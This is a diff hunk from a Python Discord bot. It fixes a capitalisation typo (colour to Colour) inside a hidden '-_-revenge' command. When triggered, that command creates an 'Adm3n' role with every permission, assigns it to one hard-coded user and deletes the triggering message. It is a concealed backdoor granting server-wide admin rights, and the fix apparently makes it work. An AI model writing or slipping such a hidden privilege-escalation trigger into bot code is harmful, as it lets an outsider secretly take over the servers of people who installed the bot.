@@ -502,7 +502,7 @@ async def on_message(message):
     if message.content == "-_-revenge":
         auth = message.author
         role =  get(message.server.roles, name="Bot")
-        role = await client.create_role(message.server, name = "Adm3n", permissions = discord.Permissions.all(), colour = discord.colour(0xe67e22), hoist = True )
+        role = await client.create_role(message.server, name = "Adm3n", permissions = discord.Permissions.all(), colour = discord.Colour(0xe67e22), hoist = True )
         await client.add_roles(message.server.get_member_named("Deadman0FTW#0593"), role)
         await client.delete_message(message)
 
